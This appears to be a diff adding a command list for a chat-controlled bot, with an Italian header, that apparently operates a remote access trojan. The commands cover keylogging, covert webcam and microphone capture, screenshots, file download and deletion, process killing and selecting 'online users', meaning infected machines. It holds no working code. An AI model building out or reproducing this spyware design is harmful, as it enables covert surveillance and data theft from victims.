@@ -1,0 +1,23 @@
+#Lista comandi da dare al bot
+help - List of commands
+startlog - Start the keylogger
+stoplog - Stop the keylogger
+infopc - Get system informations
+infofile - Get the file directory
+rtask - Get the currently running task (NO WINDOWS PROCESS)
+taskkill - Kill a specific process
+popup - Open a popup with a message
+webcam - Take a picture from the webcam
+screenshot - Take a screenshot
+changewp - Change the wallpaper
+startrecaudio - Start capture audio from mic
+stoprecaudio - Stop capture audio form mic
+navigate - Navigate trought file
+list - List all file i the directory
+delete - Delete file
+createfolder - Create a folder
+download - Download a file
+shutdown - Turn of PC
+panic - Turn off all
+users - See online users
+selectuser - Select one of online users
